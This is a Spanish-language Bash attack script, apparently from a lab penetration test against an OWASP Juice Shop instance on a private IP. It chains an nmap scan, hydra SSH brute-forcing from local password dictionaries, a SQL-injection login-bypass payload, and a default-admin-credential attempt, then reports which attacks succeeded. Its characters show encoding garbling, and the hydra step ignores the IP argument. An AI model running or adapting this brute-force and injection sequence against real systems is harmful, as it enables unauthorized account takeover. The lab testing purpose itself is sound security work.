#!/bin/bash
# Script de ATAQUE PENTEST - CONTINUA DESPU√âS DE FALLOS
# Uso: ./pentest_attack.sh 192.168.133.131

echo "=== ATAQUE A JUICE SHOP (Contin√∫a despu√©s de fallos) ==="
echo "IP: $1"
echo ""

# Paths a diccionarios
USUARIOS_PATH="/home/elpepe/Pentest_Planta_Eolica_CBS/FASE_2_ATAQUE/fuerza_brute_ssh/diccionarios/usuarios.txt"
CONTRASE√ëAS_PATH="/home/elpepe/Pentest_Planta_Eolica_CBS/FASE_2_ATAQUE/fuerza_brute_ssh/diccionarios/passwords.txt"

# Funci√≥n para continuar despite errores
continuar_si_falla() {
    local descripcion="$1"
    local comando="$2"
    
    echo "$descripcion"
    eval "$comando" 2>/dev/null
    local resultado=$?
    
    if [ $resultado -eq 0 ]; then
        echo "‚úÖ √âXITO - Vulnerabilidad explotada"
    else
        echo "‚ùå FALL√ì - Mitigado o no funcion√≥"
    fi
    echo ""
    
    return 0  # Siempre retorna √©xito para continuar
}

# 1. PORTSCAN (siempre funciona)
echo "1. üîç PORTSCAN:"
sudo nmap -sS -sV --open -p 22,3000 $1
echo ""

# 2. FUERZA BRUTA SSH CON HYDRA (contin√∫a si falla)

cd /home/elpepe/Pentest_Planta_Eolica_CBS/FASE_2_ATAQUE/fuerza_brute_ssh/diccionarios

hydra -L usuarios.txt -P passwords.txt ssh://192.168.133.131 -t 4 -vV -I

# 3. SQL INJECTION EN JUICE SHOP (contin√∫a si falla)
continuar_si_falla "3. üóÉÔ∏è SQL INJECTION EN JUICE SHOP:" "curl -s -X POST http://$1:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{\"email\":\"'\\'' OR 1=1--\",\"password\":\"test\"}' | grep -q 'token'"

# 4. VERIFICAR SERVICIO WEB (siempre funciona)
echo "4. üåê VERIFICAR SERVICIO WEB:"
curl -s -I http://$1:3000 | head -5
if [ $? -eq 0 ]; then
    echo "‚úÖ √âXITO - Servicio web activo"
    echo "   URL: http://$1:3000"
else
    echo "‚ùå FALL√ì - Servicio web no responde"
fi
echo ""

# 5. PROBAR ACCESO DIRECTO AL LOGIN (contin√∫a si falla)
continuar_si_falla "5. üîê PROBAR CREDENCIALES POR DEFECTO:" "curl -s -X POST http://$1:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' | grep -q 'token'"

# 6. RESUMEN FINAL
echo "=== RESUMEN DE RESULTADOS ==="
echo "El sistema muestra qu√© ataques fueron exitosos y cu√°les fueron mitigados"
echo "Si todos fallan, las mitigaciones est√°n funcionando correctamente"
echo ""
echo "üéØ PARA VER RESULTADOS DETALLADOS:"
echo "   - Revisar salida de cada secci√≥n"
echo "   - Probar manualmente los vectores que mostraron potencial"
echo ""
echo "‚úÖ Script completado - An√°lisis listo para mitigaciones"
